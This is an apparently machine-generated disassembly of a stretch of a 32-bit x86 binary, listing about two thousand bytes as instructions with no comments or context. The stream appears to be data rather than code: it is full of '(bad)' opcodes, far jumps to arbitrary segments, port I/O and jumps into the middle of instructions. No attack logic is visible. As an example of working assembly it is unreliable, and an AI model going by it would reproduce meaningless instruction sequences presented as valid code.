  414670:	inc    edx
  414671:	std    
  414672:	mov    ebp,0x471a0d69
  414677:	mov    ah,0x79
  414679:	imul   BYTE PTR [eax+edi*8-0x56b4edf9]
  414680:	push   ebp
  414681:	push   ebp
  414682:	mov    ch,0x4c
  414684:	(bad)  
  414685:	jmp    0x2322:0x97862c1a
  41468c:	inc    esi
  41468d:	jae    0x41461d
  41468f:	add    ecx,DWORD PTR [edi-0x35]
  414692:	mov    al,ch
  414694:	or     ch,BYTE PTR [ebx+0x6fb3a41a]
  41469a:	sub    al,0x8
  41469c:	mov    bh,0x22
  41469e:	pop    esp
  41469f:	(bad)  
  4146a0:	leave  
  4146a1:	push   0x28a914a9
  4146a6:	rcl    BYTE PTR [ebx-0x6530bda1],1
  4146ac:	push   ds
  4146ad:	aaa    
  4146ae:	dec    ecx
  4146af:	das    
  4146b0:	fdivr  QWORD PTR [ecx+0x1e]
  4146b3:	sbb    BYTE PTR [esi-0x3169b856],bl
  4146b9:	and    BYTE PTR [edx+0x4b],0x51
  4146bd:	inc    edx
  4146be:	cld    
  4146bf:	add    DWORD PTR [edx],esi
  4146c1:	fdiv   st,st(0)
  4146c3:	jae    0x414734
  4146c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146c6:	pop    eax
  4146c7:	and    eax,0x981534a0
  4146cc:	or     cl,BYTE PTR [ebx]
  4146ce:	mov    eax,ds:0x2ca97357
  4146d3:	and    eax,0x4b77f03a
  4146d8:	popf   
  4146d9:	xlat   BYTE PTR ds:[ebx]
  4146da:	push   0xffffffe5
  4146dc:	inc    eax
  4146dd:	xor    esi,DWORD PTR [eax+0x3e5d9a1]
  4146e3:	jp     0x414679
  4146e5:	pop    edx
  4146e6:	(bad)  
  4146e7:	jbe    0x4146ef
  4146e9:	mov    ds:0x8a47d7d1,eax
  4146ee:	sbb    eax,0x3b61a698
  4146f3:	sub    edx,DWORD PTR [esi]
  4146f5:	lahf   
  4146f6:	or     eax,0x49b8513b
  4146fb:	(bad)  
  4146fd:	leave  
  4146fe:	lahf   
  4146ff:	outs   dx,BYTE PTR ds:[esi]
  414700:	fcom   QWORD PTR [eax+0x2e]
  414703:	jmp    0xba74:0xf8a12e3e
  41470a:	xchg   ch,bl
  41470c:	push   ebp
  41470d:	nop
  41470e:	xor    DWORD PTR [eax-0x35],0xd786487c
  414715:	rcr    DWORD PTR [ecx+0xe6a55a8],cl
  41471b:	mov    ss:0x50ab12d0,al
  414721:	jmp    0x41471a
  414723:	call   0xdde34216
  414728:	push   0xffffff84
  41472a:	in     eax,0xa9
  41472c:	fadd   QWORD PTR [ecx-0x3a022151]
  414732:	add    DWORD PTR [esi],0xdaef04e6
  414738:	cmp    edi,ebx
  41473a:	ss mov bh,0xde
  41473d:	pop    ebx
  41473e:	jmp    0x803:0xca121874
  414745:	aad    0xcd
  414747:	push   0x4b
  414749:	mov    eax,?
  41474b:	and    eax,0x9111a430
  414750:	test   BYTE PTR [edi+0x49],dl
  414753:	sbb    bh,BYTE PTR [edx+0xbb64494]
  414759:	int3   
  41475a:	push   es
  41475b:	and    BYTE PTR [ecx+ebp*8+0xe],al
  41475f:	or     ebp,DWORD PTR [ebp+0x56]
  414762:	mov    DWORD PTR [ebx],edx
  414764:	lock jo 0x41477e
  414767:	mov    DWORD PTR [ebx],ecx
  414769:	int3   
  41476a:	ds xor eax,0x3f37b2ae
  414770:	ins    DWORD PTR es:[edi],dx
  414771:	sahf   
  414772:	pushf  
  414773:	nop
  414774:	mov    cl,BYTE PTR [esi+0x33]
  414777:	mov    DWORD PTR [eax+0x5b],eax
  41477a:	mov    eax,ds:0x20bdde41
  41477f:	sbb    al,0x54
  414781:	push   eax
  414782:	xor    DWORD PTR [ebp-0x36],ebp
  414785:	lock cdq 
  414787:	push   es
  414788:	lods   al,BYTE PTR ds:[esi]
  414789:	sbb    esi,DWORD PTR [ecx+0x6f]
  41478c:	jae    0x4147ec
  41478e:	xor    BYTE PTR [ebx+0x55f44b47],ah
  414794:	test   eax,0x82d08d5d
  414799:	push   eax
  41479a:	jne    0x41476b
  41479c:	pmaxub mm3,QWORD PTR [edx+0xe]
  4147a0:	nop
  4147a1:	outs   dx,DWORD PTR ds:[esi]
  4147a2:	mov    eax,ds:0xd95f50ee
  4147a7:	xchg   ebp,eax
  4147a8:	je     0x414788
  4147aa:	sub    edx,DWORD PTR [edx]
  4147ac:	popf   
  4147ad:	ss aas 
  4147af:	ins    BYTE PTR es:[edi],dx
  4147b0:	jnp    0x4147d1
  4147b2:	adc    DWORD PTR [ebp+edx*4-0x21],edx
  4147b6:	stos   BYTE PTR es:[edi],al
  4147b7:	test   DWORD PTR ds:0xa388b736,edi
  4147bd:	(bad)  
  4147be:	sbb    eax,0xc7007c84
  4147c3:	aaa    
  4147c4:	dec    esp
  4147c5:	addr16 sub eax,0x58568d8a
  4147cb:	sub    al,0x90
  4147cd:	jmp    0x89b6c3db
  4147d2:	lock add BYTE PTR ds:0xd1931289,ch
  4147d9:	or     eax,0x873e7033
  4147de:	xor    edi,DWORD PTR [edx]
  4147e0:	sahf   
  4147e1:	js     0x41485a
  4147e3:	mov    esp,DWORD PTR [ecx]
  4147e5:	jno    0x414853
  4147e7:	(bad)  
  4147e8:	outs   dx,DWORD PTR ds:[esi]
  4147e9:	clc    
  4147ea:	pusha  
  4147eb:	sub    BYTE PTR [eax+0x74f2324],ch
  4147f1:	les    esp,FWORD PTR [eax-0x9]
  4147f4:	lea    ecx,[esi+esi*1-0x20432351]
  4147fb:	jle    0x414819
  4147fd:	imul   al
  4147ff:	out    dx,al
  414800:	mov    esi,0x9a8abf84
  414805:	add    ebx,DWORD PTR [eax-0x58]
  414808:	retf   
  414809:	retf   0xa516
  41480c:	repz or al,0x3e
  41480f:	fmul   DWORD PTR [esi]
  414811:	(bad)  
  414812:	out    0x75,eax
  414814:	lock clc 
  414816:	mov    bl,BYTE PTR [ebp-0x212a3a4e]
  41481c:	xchg   esp,eax
  41481d:	(bad)  
  41481e:	xchg   edx,eax
  41481f:	mov    ecx,0x4fdc9752
  414824:	push   ebx
  414825:	fisttp WORD PTR [ebx+ebx*8]
  414828:	outs   dx,DWORD PTR ds:[esi]
  414829:	(bad)  
  41482a:	out    dx,eax
  41482b:	sbb    al,0x77
  41482d:	and    dh,dl
  41482f:	pop    ds
  414830:	mov    al,ds:0x7a31ecd8
  414835:	test   eax,0x5bc93665
  41483a:	and    ebp,DWORD PTR [esi+edi*2]
  41483d:	lahf   
  41483e:	arpl   WORD PTR [esi+0x21],cx
  414841:	sub    DWORD PTR [esi],ebx
  414843:	sub    ch,al
  414845:	js     0x41481e
  414847:	mov    dl,0xe
  414849:	mov    ecx,0x1070ccef
  41484e:	and    esi,DWORD PTR [esp+edx*1+0x18cfd1f1]
  414855:	inc    edx
  414856:	jo     0x4148c2
  414858:	fstp   st(5)
  41485a:	fmul   QWORD PTR [esi]
  41485c:	pop    ss
  41485d:	cli    
  41485e:	addr16 popf 
  414860:	sbb    esp,edx
  414862:	xchg   ecx,eax
  414863:	sbb    dl,BYTE PTR [edi+0x24e5283d]
  414869:	pop    es
  41486a:	adc    ebp,ecx
  41486c:	bound  ecx,QWORD PTR [ecx-0x41]
  41486f:	mov    ah,0xee
  414871:	sub    dl,BYTE PTR [eax+0x4f]
  414874:	fstp   QWORD PTR [esi]
  414876:	push   cs
  414877:	mov    ecx,0x89ff1f04
  41487c:	mov    ch,0xbe
  41487e:	loopne 0x4148c0
  414880:	sti    
  414881:	or     BYTE PTR [ebx-0x5281d16c],al
  414887:	test   bh,dh
  414889:	cld    
  41488a:	fist   WORD PTR [ebp+0x25d73dfc]
  414890:	mov    BYTE PTR [ebp+0x48abf475],cl
  414896:	or     al,0x33
  414898:	repnz nop
  41489a:	add    ch,0xe4
  41489d:	xor    cl,al
  41489f:	jb     0x4148f5
  4148a1:	fcomp  QWORD PTR [ebx]
  4148a3:	jge    0x414896
  4148a5:	xchg   ebx,eax
  4148a6:	aaa    
  4148a7:	cmc    
  4148a8:	call   0xf563:0x500b52b2
  4148af:	and    al,0x41
  4148b1:	outs   dx,BYTE PTR ds:[esi]
  4148b2:	(bad)  
  4148b4:	inc    eax
  4148b5:	adc    DWORD PTR [edi],ecx
  4148b7:	mov    esi,0x786879db
  4148bc:	in     al,0x7c
  4148be:	mov    ah,0xdc
  4148c0:	sti    
  4148c1:	std    
  4148c2:	push   DWORD PTR [edi-0x51]
  4148c5:	xor    ecx,DWORD PTR [eax]
  4148c7:	inc    ebp
  4148c8:	es pusha 
  4148ca:	jle    0x4148c3
  4148cc:	push   ebx
  4148cd:	jmp    0x2b7c:0x6baca111
  4148d4:	mov    ah,0x76
  4148d6:	and    al,0x46
  4148d8:	sbb    al,0xf0
  4148da:	mul    BYTE PTR [ebx+0x1d6c004d]
  4148e0:	xchg   BYTE PTR [edx+0x59],bh
  4148e3:	pop    esi
  4148e4:	gs aad 0x41
  4148e7:	dec    esi
  4148e8:	adc    eax,0x6e67a442
  4148ed:	adc    BYTE PTR [edi],ch
  4148ef:	jns    0x414871
  4148f1:	xchg   ecx,eax
  4148f2:	in     eax,dx
  4148f3:	mov    esp,ss
  4148f5:	inc    esp
  4148f6:	fstp   QWORD PTR [ebp-0x6d9eaad1]
  4148fc:	arpl   si,dx
  4148fe:	leave  
  4148ff:	(bad)  
  414900:	hlt    
  414901:	(bad)  
  414902:	fcomp  DWORD PTR ds:0x6348d79
  414908:	int    0x92
  41490a:	clc    
  41490b:	ja     0x4148ff
  41490d:	bswap  ebp
  41490f:	and    bl,cl
  414911:	adc    eax,0x56a268de
  414916:	xor    ch,BYTE PTR [eax+0x7a]
  414919:	shl    DWORD PTR [edx],1
  41491b:	loopne 0x414992
  41491d:	fnstcw WORD PTR [edx+ecx*2+0x4c29a4a2]
  414924:	ins    DWORD PTR es:[edi],dx
  414925:	inc    ebx
  414926:	(bad)  
  414927:	in     al,0xf8
  414929:	xchg   ebp,eax
  41492a:	push   0xffffffd2
  41492c:	test   eax,0xe39dba14
  414931:	jno    0x414928
  414933:	js     0x414904
  414935:	push   esp
  414936:	jne    0x4148ca
  414938:	mov    al,ds:0xc808ae68
  41493d:	idiv   DWORD PTR es:[edx-0x3226d677]
  414944:	cmp    ebx,ecx
  414946:	popa   
  414947:	xor    DWORD PTR [eax-0x8b3b53a],0xffffff99
  41494e:	dec    esi
  41494f:	xor    eax,0xf22f1198
  414954:	out    dx,eax
  414955:	ins    BYTE PTR es:[edi],dx
  414956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414957:	jge    0x4148f7
  414959:	adc    BYTE PTR [edi],bh
  41495b:	cmc    
  41495c:	das    
  41495d:	jmp    0x4149a3
  41495f:	mov    esp,0x6789b49e
  414964:	pop    edi
  414965:	push   ebp
  414966:	retf   0xa91c
  414969:	mov    esp,0x658e9515
  41496e:	push   0xffffffee
  414970:	jne    0x414980
  414972:	neg    BYTE PTR [edi]
  414974:	and    bh,BYTE PTR [eax-0x76]
  414977:	daa    
  414978:	pusha  
  414979:	mov    ebp,DWORD PTR [edi-0x24]
  41497c:	pop    ecx
  41497d:	(bad)  
  41497e:	cli    
  41497f:	ins    BYTE PTR es:[edi],dx
  414980:	fisttp DWORD PTR [edi-0x383ecf7c]
  414986:	push   0x52
  414988:	add    eax,0x85c26518
  41498d:	xchg   ecx,eax
  41498e:	inc    ecx
  41498f:	sub    DWORD PTR [edi+edi*1+0x4c],esi
  414993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414994:	and    edi,DWORD PTR [eax-0x79]
  414997:	push   0x32555997
  41499c:	mov    ds:0x68203952,al
  4149a1:	and    ah,0x81
  4149a4:	js     0x414a0a
  4149a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149a7:	mov    bh,0xf3
  4149a9:	icebp  
  4149aa:	mov    esi,0x331ec744
  4149af:	sub    ch,bh
  4149b1:	jae    0x414961
  4149b3:	test   BYTE PTR [eax-0x7e],dl
  4149b6:	xchg   edi,eax
  4149b7:	call   0x460d7964
  4149bc:	cmp    esi,esp
  4149be:	dec    ecx
  4149bf:	popa   
  4149c0:	sub    BYTE PTR [esi+0x4657aca5],cl
  4149c6:	lods   al,BYTE PTR ds:[esi]
  4149c7:	adc    cl,BYTE PTR [edx+ebx*2+0x3a]
  4149cb:	rcl    DWORD PTR [esi],cl
  4149cd:	dec    esi
  4149ce:	hlt    
  4149cf:	push   0xa54c343a
  4149d4:	sub    DWORD PTR ds:0x5ae3daf5,ecx
  4149da:	xor    eax,0xad522a44
  4149df:	pop    DWORD PTR [ecx-0x5f]
  4149e2:	cs mov dh,dl
  4149e5:	aaa    
  4149e6:	jnp    0x4149c3
  4149e8:	xchg   esi,eax
  4149e9:	hlt    
  4149ea:	rol    BYTE PTR [ebp+0x1fcd3d0a],1
  4149f0:	aas    
  4149f1:	or     esp,DWORD PTR cs:[eax-0x7c]
  4149f5:	and    edi,DWORD PTR [edi+ebp*8]
  4149f8:	xchg   edx,eax
  4149f9:	pop    ebx
  4149fa:	nop
  4149fb:	cs cs scas eax,DWORD PTR es:[edi]
  4149fe:	mov    esp,0x6c5796b6
  414a03:	jnp    0x4149de
  414a05:	ja     0x414a53
  414a07:	mov    ebp,0x2651a7d
  414a0c:	push   edx
  414a0d:	jl     0x4149e7
  414a0f:	dec    esp
  414a10:	stos   BYTE PTR es:[edi],al
  414a11:	ins    DWORD PTR es:[edi],dx
  414a12:	out    0xd0,eax
  414a14:	mov    dl,0x24
  414a16:	sub    al,0xeb
  414a18:	les    ecx,FWORD PTR [ebx-0x78]
  414a1b:	idiv   BYTE PTR [ebp+0x2889da06]
  414a21:	jnp    0x414a6e
  414a23:	in     eax,0xa9
  414a25:	add    al,0x84
  414a27:	xchg   esi,ebp
  414a29:	xor    ebp,DWORD PTR [edx+0x43]
  414a2c:	add    al,0xfb
  414a2e:	ret    
  414a2f:	in     eax,0xb
  414a31:	inc    edx
  414a32:	js     0x414aa9
  414a34:	adc    ah,BYTE PTR [edi]
  414a36:	int3   
  414a37:	and    ebx,DWORD PTR [ebp-0xc]
  414a3a:	xchg   ebx,eax
  414a3b:	stc    
  414a3c:	das    
  414a3d:	out    dx,eax
  414a3e:	cmp    al,0x89
  414a40:	pop    ss
  414a41:	jle    0x414a1f
  414a43:	js     0x414a0b
  414a45:	mov    eax,ds:0x781348e4
  414a4a:	mov    bh,0xa
  414a4c:	push   ds
  414a4d:	outs   dx,BYTE PTR ds:[esi]
  414a4e:	sub    eax,0x69f78093
  414a53:	in     eax,dx
  414a54:	jno    0x414a8e
  414a56:	jmp    0x13cd:0x4a44c36f
  414a5d:	sbb    edx,DWORD PTR [eax-0x71]
  414a60:	sbb    ah,bh
  414a62:	mov    esi,0x7f38e109
  414a67:	mov    eax,ds:0x525a077
  414a6c:	fdiv   st(3),st
  414a6e:	outs   dx,BYTE PTR ds:[esi]
  414a6f:	mov    bl,0x5f
  414a71:	or     DWORD PTR [ebp-0x33],ecx
  414a74:	add    DWORD PTR ds:0x23b62935,ecx
  414a7a:	jmp    0xbad3:0xfc347459
  414a81:	mov    ds:0xd0e0fffe,al
  414a86:	pop    ss
  414a87:	test   BYTE PTR [ecx-0x55],bl
  414a8a:	mov    gs,bp
  414a8d:	in     al,0x7f
  414a8f:	test   al,dl
  414a91:	enter  0x563,0x2b
  414a95:	(bad)  
  414a96:	shl    BYTE PTR [ebx-0x6a8e0972],cl
  414a9c:	jo     0x414ab6
  414a9e:	cmp    dl,BYTE PTR [edx+0x10]
  414aa1:	mov    ds:0xd5bea67d,al
  414aa6:	lds    edx,FWORD PTR [ebx]
  414aa8:	ja     0x414a41
  414aaa:	call   0x8f670f8e
  414aaf:	inc    esi
  414ab0:	jmp    0x4bcf:0x9e01da06
  414ab7:	mov    DWORD PTR [ebp+0x1a66372e],eax
  414abd:	lods   al,BYTE PTR ds:[esi]
  414abe:	lock call 0xbbbbd32
  414ac4:	mov    edi,0x3d0e31d6
  414ac9:	pushf  
  414aca:	inc    ebx
  414acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414acc:	aad    0xb8
  414ace:	push   edx
  414acf:	fadd   QWORD PTR [ebx-0xd5fb722]
  414ad5:	adc    DWORD PTR ds:0x9534236d,0xffffffdd
  414adc:	sub    ebp,edi
  414ade:	jb     0x414ac6
  414ae0:	cmp    BYTE PTR [esi-0x79bfcbc3],ch
  414ae6:	inc    esp
  414ae7:	fsub   QWORD PTR [ecx]
  414ae9:	rol    ebp,cl
  414aeb:	jns    0x414a8c
  414aed:	jle    0x414b33
  414aef:	push   ecx
  414af0:	call   0x872bfd69
  414af5:	jmp    0x778da7bf
  414afa:	daa    
  414afb:	(bad)  
  414afc:	and    dh,BYTE PTR [edx+0x6d233b9f]
  414b02:	push   ebx
  414b03:	loop   0x414aff
  414b05:	add    bh,dl
  414b07:	jmp    0xa481f057
  414b0c:	ret    0x2bca
  414b0f:	es aam 0x3a
  414b12:	cwde   
  414b13:	xor    al,0xe4
  414b15:	adc    ah,dh
  414b17:	int3   
  414b18:	fistp  QWORD PTR [ebx]
  414b1a:	mov    esi,0x87ca56bd
  414b1f:	popf   
  414b20:	jae    0x414b9f
  414b22:	test   esi,0x9338d716
  414b28:	inc    edx
  414b29:	adc    edx,DWORD PTR [eax]
  414b2b:	mov    edx,DWORD PTR [ebp-0x7e]
  414b2e:	mov    ebp,0x3db73f03
  414b33:	push   esp
  414b34:	fwait
  414b35:	mov    cl,0x9f
  414b37:	cmp    bl,BYTE PTR [ebx+ecx*4-0x22356c4c]
  414b3e:	sti    
  414b3f:	mov    ebp,0x1adcbaaf
  414b44:	mov    bh,0x1
  414b46:	xchg   cl,cl
  414b48:	sbb    BYTE PTR [edi+0x5c],0x58
  414b4c:	cld    
  414b4d:	or     eax,0x8f7882c5
  414b52:	nop
  414b53:	test   al,0xac
  414b55:	test   al,0xee
  414b57:	ja     0x414b51
  414b59:	in     al,0x37
  414b5b:	retf   
  414b5c:	inc    ecx
  414b5d:	mov    esi,0xee5a8cbc
  414b62:	push   esp
  414b63:	cdq    
  414b64:	dec    ecx
  414b65:	ror    cl,cl
  414b67:	push   ss
  414b68:	push   ds
  414b69:	push   ecx
  414b6a:	adc    ebx,esp
  414b6c:	iret   
  414b6d:	arpl   WORD PTR [edi+0x76],di
  414b70:	in     al,0xc0
  414b72:	adc    eax,0x249715c6
  414b77:	xchg   ecx,eax
  414b78:	test   DWORD PTR [ebx],ebx
  414b7a:	repz imul esi,DWORD PTR [edx],0x969d5f83
  414b81:	jl     0x414be9
  414b83:	xor    DWORD PTR [edi+0x21],0xffffffd7
  414b87:	dec    eax
  414b88:	ds retf 0x9562
  414b8c:	cmp    bl,BYTE PTR [edi-0x7e026a23]
  414b92:	out    0xb2,al
  414b94:	jns    0x414c04
  414b96:	cmp    eax,0xb516f385
  414b9b:	adc    DWORD PTR [esi],esi
  414b9d:	cmp    DWORD PTR [edi],esi
  414b9f:	push   0xffffffae
  414ba1:	and    al,0x48
  414ba3:	cmc    
  414ba4:	sbb    BYTE PTR [eax+0x50],bl
  414ba7:	push   cs
  414ba8:	xchg   esi,eax
  414ba9:	inc    esi
  414baa:	xor    dh,0x6f
  414bad:	adc    BYTE PTR [ebx+ebp*4],dh
  414bb0:	out    dx,eax
  414bb1:	inc    ebp
  414bb2:	mov    ah,0x51
  414bb4:	add    edx,0xffffff90
  414bb7:	mov    edi,0x66bff362
  414bbc:	gs in  al,dx
  414bbe:	(bad)  
  414bbf:	dec    ebp
  414bc0:	enter  0x2110,0x9c
  414bc4:	cld    
  414bc5:	sub    dh,BYTE PTR [eax+0xf5059b5]
  414bcb:	aam    0xd8
  414bcd:	push   ds
  414bce:	xor    al,BYTE PTR [esi+0x5d]
  414bd1:	pushf  
  414bd2:	mov    ecx,DWORD PTR [esi]
  414bd4:	loop   0x414bf7
  414bd6:	out    0x71,eax
  414bd8:	or     DWORD PTR [esi+0x75],ecx
  414bdb:	es scas eax,DWORD PTR es:[edi]
  414bdd:	out    0x93,al
  414bdf:	lock or al,0x4d
  414be2:	std    
  414be3:	mov    cs,eax
  414be5:	call   0x5fea:0x55123d47
  414bec:	push   ebp
  414bed:	rcr    ebx,1
  414bef:	lods   al,BYTE PTR ds:[esi]
  414bf0:	retf   
  414bf1:	sub    ebx,0x24027cd3
  414bf7:	xor    al,0xc8
  414bf9:	(bad)  
  414bfa:	mov    cl,0x8c
  414bfc:	adc    esp,eax
  414bfe:	(bad)  
  414bff:	rol    cl,1
  414c01:	jns    0x414c5b
  414c03:	dec    eax
  414c04:	neg    DWORD PTR [eax+0x7f788919]
  414c0a:	mov    WORD PTR ds:0xcbaa326f,?
  414c10:	out    0xd8,eax
  414c12:	pushf  
  414c13:	adc    cl,BYTE PTR [esp+ebp*2-0x2c]
  414c17:	xchg   DWORD PTR [ebx+ebx*8],eax
  414c1a:	data16 xor al,0xd0
  414c1d:	cmp    ebp,ebx
  414c1f:	dec    eax
  414c20:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c22:	push   0xffffff8d
  414c24:	xor    ch,cl
  414c26:	and    eax,0x8dd1b0ce
  414c2b:	adc    al,0xf1
  414c2d:	sti    
  414c2e:	std    
  414c2f:	push   0x4276554e
  414c34:	ja     0x414c64
  414c36:	mov    ah,0xf2
  414c38:	sub    BYTE PTR [edx+0x31],0x74
  414c3c:	sar    BYTE PTR [edi-0x71],cl
  414c3f:	in     al,0x26
  414c41:	or     BYTE PTR [esi],bh
  414c43:	test   al,0x22
  414c45:	sbb    bh,cl
  414c47:	pop    edx
  414c48:	xchg   ebx,eax
  414c49:	and    al,0x76
  414c4b:	ja     0x414c34
  414c4d:	in     eax,dx
  414c4e:	in     al,0x65
  414c50:	jmp    0x69e0d273
  414c55:	sub    al,0x6a
  414c57:	scas   eax,DWORD PTR es:[edi]
  414c58:	(bad)  
  414c59:	hlt    
  414c5a:	mov    ch,0x34
  414c5c:	sub    ebx,DWORD PTR [eax-0x3e]
  414c5f:	mov    ebp,0x510e9839
  414c64:	out    dx,eax
  414c65:	out    dx,al
  414c66:	test   al,0xe9
  414c68:	xor    bl,dl
  414c6a:	imul   ebx,DWORD PTR [ebx],0x633d16a5
  414c70:	aam    0xcb
  414c72:	xor    BYTE PTR [edx],cl
  414c74:	ror    BYTE PTR [esi-0x34f0d0e5],1
  414c7a:	xchg   esi,eax
  414c7b:	add    al,0x9f
  414c7d:	ficom  WORD PTR [ebx+0xe]
  414c80:	stc    
  414c81:	test   BYTE PTR ds:[edx-0x1c],al
  414c85:	jge    0x414cd5
  414c87:	daa    
  414c88:	mov    ebp,es
  414c8a:	ror    BYTE PTR [ebx],0x14
  414c8d:	fisub  WORD PTR [eax-0x3a]
  414c90:	pop    ebx
  414c91:	sbb    DWORD PTR [edi],esp
  414c93:	xchg   edx,eax
  414c94:	push   edi
  414c95:	xchg   ebp,eax
  414c96:	retf   
  414c97:	and    DWORD PTR [ecx-0x9],eax
  414c9a:	je     0x414c39
  414c9c:	sbb    edi,esi
  414c9e:	sub    BYTE PTR [esi],0xd9
  414ca1:	pop    ds
  414ca2:	shr    BYTE PTR [ecx],cl
  414ca4:	ins    BYTE PTR es:[edi],dx
  414ca5:	jp     0x414c31
  414ca7:	and    dl,ch
  414ca9:	xor    eax,0x4fccaf12
  414cae:	mov    ds:0x80fb95a0,al
  414cb3:	push   es
  414cb4:	imul   eax,DWORD PTR [edi],0x98d9621f
  414cba:	loopne 0x414c3e
  414cbc:	out    0xc3,al
  414cbe:	cld    
  414cbf:	mov    fs,esp
  414cc1:	fnstenv [eax-0x3e6bf3d2]
  414cc7:	out    0xce,al
  414cc9:	inc    ebp
  414cca:	cdq    
  414ccb:	les    edi,FWORD PTR [edx+ebp*1+0x74bcafc0]
  414cd2:	jmp    0xe2c7:0xe12814ab
  414cd9:	pop    ebp
  414cda:	test   BYTE PTR ds:0x5fa0dc42,bl
  414ce0:	pop    esi
  414ce1:	or     eax,0x9e580e00
  414ce6:	mov    al,0xb7
  414ce8:	fwait
  414ce9:	mov    DWORD PTR ds:0x3c806843,esi
  414cef:	push   esi
  414cf0:	test   eax,0xeb7d22d9
  414cf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cf6:	sahf   
  414cf7:	sbb    eax,0xeaf98c14
  414cfc:	dec    edx
  414cfd:	jp     0x414c84
  414cff:	lds    ebp,FWORD PTR ds:0xfb66826d
  414d05:	push   ebx
  414d06:	addr16 gs stc 
  414d09:	dec    ecx
  414d0a:	adc    edx,eax
  414d0c:	xor    DWORD PTR [ebx-0x53],0xffffff81
  414d10:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  414d12:	stc    
  414d13:	pop    es
  414d14:	jge    0x414d5b
  414d16:	mov    bl,cl
  414d18:	push   0xfffffff7
  414d1a:	retf   0xe0c5
  414d1d:	jns    0x414d23
  414d1f:	pop    edx
  414d20:	pusha  
  414d21:	sub    BYTE PTR [edi],dl
  414d23:	ds sbb esi,ebp
  414d26:	cwde   
  414d27:	mov    ecx,0xe858b61
  414d2c:	mov    edi,0x4e6cdfc6
  414d31:	out    0xa,al
  414d33:	cmp    esp,ebx
  414d35:	push   esp
  414d36:	neg    BYTE PTR [ebx+0x3]
  414d39:	ss fst QWORD PTR fs:[edi+0x13096bb1]
  414d41:	dec    ebx
  414d42:	cli    
  414d43:	data16 scas al,BYTE PTR es:[edi]
  414d45:	loop   0x414cf7
  414d47:	or     ecx,DWORD PTR [ebx+0x78]
  414d4a:	cmp    BYTE PTR [ebx],al
  414d4c:	lea    edx,[ecx]
  414d4e:	dec    eax
  414d4f:	push   0x34
  414d51:	dec    edi
  414d52:	mov    bl,0x73
  414d54:	rcl    DWORD PTR [ebx+0x65],cl
  414d57:	aas    
  414d58:	xor    ebp,DWORD PTR [edx-0x479ebac]
  414d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d5f:	jecxz  0x414ddc
  414d61:	sbb    BYTE PTR [ecx+0x36a3c6f8],cl
  414d67:	dec    ebx
  414d68:	xchg   DWORD PTR [edx],esi
  414d6a:	(bad)  
  414d6b:	ds cmp al,0x16
  414d6e:	sub    DWORD PTR [esp+ebx*8+0xe6fa2d0],edx
  414d75:	push   edx
  414d76:	cmp    dh,bh
  414d78:	xchg   ebp,eax
  414d79:	loopne 0x414df1
  414d7b:	xchg   ebx,eax
  414d7c:	push   edi
  414d7d:	jmp    0x414db9
  414d7f:	and    eax,0xfc93b302
  414d84:	aad    0x5
  414d86:	push   esp
  414d87:	cli    
  414d88:	mov    esi,0xf013fd3c
  414d8d:	push   esi
  414d8e:	or     eax,ecx
  414d90:	scas   eax,DWORD PTR es:[edi]
  414d91:	and    ecx,esi
  414d93:	fild   WORD PTR [edx]
  414d95:	lods   eax,DWORD PTR ds:[esi]
  414d96:	adc    BYTE PTR [ebx],bh
  414d98:	and    eax,0xade938ed
  414d9d:	std    
  414d9e:	test   al,0x6d
  414da0:	lock jb 0x414d55
  414da3:	dec    ebx
  414da4:	loopne 0x414d5d
  414da6:	jecxz  0x414dc4
  414da8:	sar    BYTE PTR [edx],0x20
  414dab:	jg     0x414e29
  414dad:	pusha  
  414dae:	das    
  414daf:	add    DWORD PTR [ecx],esp
  414db1:	mov    ds:0x6675ef9c,eax
  414db6:	and    ah,bl
  414db8:	add    BYTE PTR [eax],0xa6
  414dbb:	mov    ebx,0x9bf37db
  414dc0:	pusha  
  414dc1:	mov    dh,BYTE PTR [ebp-0x42]
  414dc4:	adc    ebp,DWORD PTR [esi+edx*2]
  414dc7:	fldenv [ecx+0x1]
  414dca:	psubusb mm2,mm0
  414dcd:	or     ah,0x3
  414dd0:	push   edi
  414dd1:	scas   al,BYTE PTR es:[edi]
  414dd2:	pop    edi
  414dd3:	and    DWORD PTR [ebx+0x27e24d1c],esi
  414dd9:	add    BYTE PTR [esi-0x6f],ah
  414ddc:	adc    BYTE PTR [eax-0x27ad349],ah
  414de2:	lods   al,BYTE PTR ds:[esi]
  414de3:	nop
  414de4:	sti    
  414de5:	push   edi
  414de6:	into   
  414de7:	mov    si,WORD PTR [eax]
  414dea:	push   ds
  414deb:	sub    al,0x71
  414ded:	inc    esi
  414dee:	nop
  414def:	xor    edi,edi
  414df1:	adc    BYTE PTR [ecx+esi*8+0x78],0xdf
  414df6:	sub    al,0x67
  414df8:	int3   
  414df9:	ins    BYTE PTR es:[edi],dx
  414dfa:	lds    esp,FWORD PTR [eax-0x3a]
  414dfd:	std    
  414dfe:	mov    dh,0x19
  414e00:	into   
  414e01:	and    ch,BYTE PTR [edi]
  414e03:	add    DWORD PTR [ebx],ebx
  414e05:	xor    DWORD PTR [ecx+0x1023cc4],ebp
  414e0b:	and    al,0xc6
  414e0d:	sbb    BYTE PTR [esp+esi*2+0x77e990e0],0x54
  414e15:	pop    edx
  414e16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e18:	aam    0x6e
  414e1a:	mov    ch,0xb1
  414e1c:	inc    esp
  414e1d:	dec    ebx
  414e1e:	iret   
  414e1f:	jl     0x414db6
  414e21:	dec    esi
  414e22:	gs mov edx,0x5bb1ee1f
  414e28:	mov    eax,ds:0x11debd1d
  414e2d:	xor    eax,0x848e2634
  414e32:	in     al,0x55
  414e34:	outs   dx,BYTE PTR ds:[esi]
  414e35:	outs   dx,DWORD PTR ds:[esi]
  414e36:	and    ecx,DWORD PTR [eax-0x1c]
  414e39:	fmul   QWORD PTR [eax+0x77eed40b]
  414e3f:	rcl    esp,0x20
  414e42:	pop    eax
  414e43:	mov    edx,0xd911e9b2
  414e48:	xor    eax,0xae45abc0
  414e4d:	test   al,dl
  414e4f:	fiadd  WORD PTR [edi+0x2d]
